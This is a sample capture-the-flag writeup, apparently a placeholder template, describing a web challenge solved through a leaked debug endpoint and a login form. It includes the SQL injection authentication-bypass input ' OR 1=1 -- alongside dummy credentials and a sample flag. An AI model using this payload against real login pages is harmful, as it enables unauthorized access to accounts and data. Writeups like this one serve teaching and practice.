# Sample CTF Challenge Writeup

**CTF:** Example CTF 2026  
**Category:** Web Exploitation  
**Points:** 200  
**Difficulty:** Medium

---

## Challenge Description

We are given a web application with a login page. The goal is to find the hidden flag.

## Reconnaissance

First, I checked the page source and found an interesting comment:

```html
<!-- TODO: remove debug endpoint /api/debug -->
```

## Exploitation

Navigating to `/api/debug` revealed a JSON response with database credentials:

```json
{
  "db_host": "localhost",
  "db_user": "admin",
  "db_pass": "changeme123"
}
```

Using these credentials with a SQL injection on the login form:

```sql
' OR 1=1 --
```

This bypassed authentication and revealed the flag on the dashboard.

## Flag

```
flag{th1s_1s_a_s4mpl3_fl4g}
```

## Lessons Learned

- Always check page source for developer comments
- Debug endpoints should be removed in production
- Input sanitization is critical for preventing SQL injection

---

*Replace this file with your actual CTF writeups!*
